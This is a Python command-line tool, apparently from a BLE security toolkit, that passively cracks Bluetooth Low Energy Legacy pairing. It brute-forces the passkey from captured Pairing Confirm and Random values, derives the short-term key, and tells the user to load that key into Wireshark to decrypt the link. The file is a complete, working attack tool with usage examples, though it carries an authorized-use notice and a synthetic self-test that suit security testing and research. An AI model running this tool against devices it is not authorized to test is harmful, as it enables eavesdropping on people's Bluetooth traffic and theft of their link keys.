#!/usr/bin/env python3
"""Passive crack of Legacy pairing (crackle-style) — phase B.

Authorized use only: run this only against devices you own or are explicitly
authorized to test. Misuse may be illegal in your jurisdiction. See
host/security/README.md ("Responsible use").

Principle: in the Legacy pairing of BLE 4.0/4.1 the short-term key STK is derived
from a temporary key TK, and TK is:
  - Just Works: TK = 0
  - Passkey: TK = a 6-digit number (0..999999)
  - OOB: TK = a 128-bit out-of-band value (cannot be brute-forced; this tool skips it)

During pairing the two sides exchange Confirm values, where Confirm = c1(TK, Random, ...).
After capturing the pairing packets, try TK from 0 to 999999: whichever value produces a
c1 equal to the captured Mconfirm is the real TK. Once TK is found you can compute
STK = s1(TK, Srand, Mrand), and from there decrypt the encrypted link / the LTK
distributed afterwards.

⚠️ Only works for Legacy pairing. Modern devices commonly use LE Secure Connections
   (P-256 ECDH), which is mathematically impossible to crack passively — no sniffer
   can do it; that is not a shortcoming of this tool.

Usage:
  # Synthetic-pairing self-test (no hardware/capture needed; verifies the crack logic)
  tools/crack_legacy.py --selftest

  # Crack from a capture: open the capture in Wireshark, find the SMP Pairing Request/
  # Response/Confirm/Random and the CONNECT_IND addresses, then fill the values below
  tools/crack_legacy.py \\
      --preq 01040001100303 --pres 02000001100202 \\
      --ia 112233445566 --iat 0 --ra AABBCCDDEEFF --rat 0 \\
      --mrand <Mrand 32hex> --mconfirm <Mconfirm 32hex> \\
      --srand <Srand 32hex>

Where the fields are in Wireshark:
  preq/pres  = the full SMP "Pairing Request"/"Pairing Response" PDU (7 bytes)
  mconfirm   = the Confirm Value of the "Pairing Confirm" sent by the central
  mrand/srand= the Random Value of the "Pairing Random" sent by the central/peripheral
  ia/ra      = the InitA / AdvA of CONNECT_IND; iat/rat = the matching address type (0=public 1=random)
"""

import argparse
import sys

from ble_crypto import c1, s1


# ---- Crack core (pure computation, can be strictly verified offline) ----

def crack_tk(preq, pres, iat, ia, rat, ra, mrand, mconfirm, max_passkey=999999):
    """Brute-force TK. Returns (tk_bytes, passkey) or None.

    passkey=0 also covers Just Works (TK=0).
    """
    for passkey in range(max_passkey + 1):
        tk = passkey.to_bytes(16, "big")
        if c1(tk, mrand, preq, pres, iat, ia, rat, ra) == mconfirm:
            return tk, passkey
    return None


def derive_stk(tk, srand, mrand):
    """STK = s1(TK, Srand, Mrand)."""
    return s1(tk, srand, mrand)


# ---- Synthetic-pairing self-test: build data from a known TK, verify it can be recovered ----

def selftest():
    ok = True

    # Fixed inputs (reproducible), covering both Just Works and Passkey
    preq = bytes.fromhex("01040001100303")   # 7-byte Pairing Request PDU
    pres = bytes.fromhex("02000001100202")   # 7-byte Pairing Response PDU
    iat, rat = 0x00, 0x00
    ia = bytes.fromhex("112233445566")
    ra = bytes.fromhex("AABBCCDDEEFF")
    mrand = bytes.fromhex("0102030405060708090A0B0C0D0E0F10")
    srand = bytes.fromhex("101112131415161718191A1B1C1D1E1F")

    for label, passkey in [("Just Works(TK=0)", 0), ("Passkey 123456", 123456)]:
        tk = passkey.to_bytes(16, "big")
        # Build each side's Confirm (exactly the value the devices would really send)
        mconfirm = c1(tk, mrand, preq, pres, iat, ia, rat, ra)

        # Give the cracker only Confirm/Random/params and let it recover TK on its own
        # Passkey 123456 takes over 120k tries; cap the max to save time
        result = crack_tk(preq, pres, iat, ia, rat, ra, mrand, mconfirm,
                          max_passkey=max(passkey + 5, 10))
        if result is None:
            print(f"{label}: FAIL (TK not cracked)")
            ok = False
            continue

        got_tk, got_pk = result
        stk = derive_stk(got_tk, srand, mrand)
        stk_expect = s1(tk, srand, mrand)
        good = got_pk == passkey and stk == stk_expect
        print(f"{label}: {'PASS' if good else 'FAIL'}  "
              f"cracked passkey={got_pk}  STK={stk.hex()}")
        ok = ok and good

    return ok


def crack_from_inputs(a) -> int:
    preq = bytes.fromhex(a.preq)
    pres = bytes.fromhex(a.pres)
    ia = bytes.fromhex(a.ia)
    ra = bytes.fromhex(a.ra)
    mrand = bytes.fromhex(a.mrand)
    mconfirm = bytes.fromhex(a.mconfirm)

    for name, val, n in [("preq", preq, 7), ("pres", pres, 7), ("ia", ia, 6),
                         ("ra", ra, 6), ("mrand", mrand, 16),
                         ("mconfirm", mconfirm, 16)]:
        if len(val) != n:
            print(f"Error: {name} should be {n} bytes, got {len(val)}", file=sys.stderr)
            return 1

    print("== Brute-forcing TK (0..999999)...")
    result = crack_tk(preq, pres, a.iat, ia, a.rat, ra, mrand, mconfirm)
    if result is None:
        print("TK not cracked. Could be OOB pairing, or this is LE Secure Connections"
              " (P-256, cannot be cracked passively), or the captured fields are wrong.")
        return 1

    tk, passkey = result
    print(f"Hit! TK = {tk.hex()}  (passkey = {passkey}"
          f"{'  i.e. Just Works' if passkey == 0 else ''})")

    if a.srand:
        srand = bytes.fromhex(a.srand)
        stk = derive_stk(tk, srand, mrand)
        print(f"STK = {stk.hex()}")
        print("Enter STK as the LTK in Wireshark (Protocols → BT SMP → or use the nRF Sniffer"
              " key input) to decrypt the encrypted-link plaintext.")
    else:
        print("(provide --srand to also compute STK)")

    return 0


def main():
    ap = argparse.ArgumentParser(description="Passive crack of Legacy pairing")
    ap.add_argument("--selftest", action="store_true", help="synthetic-pairing self-test")
    ap.add_argument("--preq", help="Pairing Request PDU, 7-byte hex")
    ap.add_argument("--pres", help="Pairing Response PDU, 7-byte hex")
    ap.add_argument("--ia", help="Initiator address, 6-byte hex")
    ap.add_argument("--iat", type=int, default=0, help="Initiator address type 0/1")
    ap.add_argument("--ra", help="Advertiser address, 6-byte hex")
    ap.add_argument("--rat", type=int, default=0, help="Advertiser address type 0/1")
    ap.add_argument("--mrand", help="Master Pairing Random, 16-byte hex")
    ap.add_argument("--mconfirm", help="Master Pairing Confirm, 16-byte hex")
    ap.add_argument("--srand", help="Slave Pairing Random, 16-byte hex (for computing STK)")
    args = ap.parse_args()

    if args.selftest:
        print("== Legacy pairing crack self-test (synthetic pairing, recover from known TK)")
        return 0 if selftest() else 1

    required = [args.preq, args.pres, args.ia, args.ra, args.mrand, args.mconfirm]
    if all(required):
        return crack_from_inputs(args)

    ap.print_help()
    return 1


if __name__ == "__main__":
    sys.exit(main())
